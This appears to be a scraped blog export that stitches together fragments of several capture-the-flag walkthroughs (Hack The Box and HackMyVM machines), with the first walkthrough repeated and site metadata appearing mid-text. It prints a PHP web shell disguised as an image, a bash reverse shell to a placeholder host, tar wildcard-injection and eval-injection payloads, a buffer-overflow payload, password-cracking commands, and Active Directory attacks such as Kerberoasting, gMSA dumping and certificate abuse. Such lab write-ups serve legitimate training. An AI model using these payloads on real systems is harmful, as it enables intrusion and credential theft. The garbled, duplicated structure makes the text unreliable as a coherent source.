When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This way, we can simulate the domain time and make Kerberos work.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; ./targetedKerberoast.py -v -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;henry\u0026#39; -p \u0026#39;H3nry_987TGV!\u0026#39; We copy the hash and crack it with John The Ripper.\njohn -w=/usr/share/wordlists/rockyou.txt hash_alfred With access to the Alfred account, we look in BloodHound for a new way to escalate to another user.\nAs we can see, we have the ability to add Alfred to the INFRASTRUCTURE group. Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password. In this case, we use bloodyAD instead of impacket-owneredit because it allows us to work directly with account hashes in a simpler and more reliable way to change passwords without needing the plaintext password.\nbloodyAD --host 10.10.11.72 -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;ansible_dev$\u0026#39; -p \u0026#39;:ecb4146b3f99e6bbf06ca896f504227c\u0026#39; set password SAM \u0026#39;sam123\u0026#39;\r[+] Password changed successfully!

This OU corresponds to the Active Directory Certificate Services infrastructure, which manages certificate issuance and usage within the domain.\nWith this control, we can abuse the certificate configuration, and to do so, we use Certipy-AD, which allows us to enumerate, create, and request misconfigured certificates to escalate privileges within the domain.\ncertipy-ad find -u \u0026#39;john@tombwatcher.htb\u0026#39; -p \u0026#39;john123\u0026#39; -dc-ip 10.10.11.72 In the WebServer certificate template, we encounter a SID (S-1-5-21-1392491010-1358638721-2126982587-1111), so we decide to search the system to see which user or group it belongs to.\nGet-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -Properties * Nothing is found, so this SID likely corresponds to a deleted user or group or a special internal domain object that no longer exists.\nTo verify if the SID corresponds to a deleted object in Active Directory, you can use PowerShell with the ActiveDirectory module and search in the Deleted Objects tomb.\nGet-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -IncludeDeletedObjects -Properties * This will search the deleted objects and show whether that SID corresponds to a deleted user or group.\nResult:\n*Evil-WinRM* PS C:\\Users\\john\\Desktop\u0026gt; Get-ADObject -Filter {ObjectSID -eq \u0026#34;S-1-5-21-1392491010-1358638721-2126982587-1111\u0026#34;} -IncludeDeletedObjects -Properties *\raccountExpires : 9223372036854775807\rbadPasswordTime : 0\rbadPwdCount : 0\rCanonicalName : tombwatcher.htb/Deleted Objects/cert_admin\rDEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf\rCN : cert_admin\rDEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf\rcodePage : 0\rcountryCode : 0\rCreated : 11/16/2024 12:07:04 PM\rcreateTimeStamp : 11/16/2024 12:07:04 PM\rDeleted : True\rDescription :\rDisplayName :\rDistinguishedName : CN=cert_admin\\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb\rdSCorePropagationData : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}\rgivenName : cert_admin\rinstanceType : 4\risDeleted : True\rLastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb\rlastLogoff : 0\rlastLogon : 0\rlogonCount : 0\rModified : 11/16/2024 12:07:27 PM\rmodifyTimeStamp : 11/16/2024 12:07:27 PM\rmsDS-LastKnownRDN : cert_admin\rName : cert_admin\rDEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf\rnTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity\rObjectCategory :\rObjectClass : user\rObjectGUID : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf\robjectSid : S-1-5-21-1392491010-1358638721-2126982587-1111\rprimaryGroupID : 513\rProtectedFromAccidentalDeletion : False\rpwdLastSet : 133762504248946345\rsAMAccountName : cert_admin\rsDRightsEffective : 7\rsn : cert_admin\ruserAccountControl : 66048\ruSNChanged : 13197\ruSNCreated : 13186\rwhenChanged : 11/16/2024 12:07:27 PM\rwhenCreated : 11/16/2024 12:07:04 PM We can restore the deleted user cert_admin because it is still in the Deleted Objects tomb of Active Directory.

This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much.

I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named 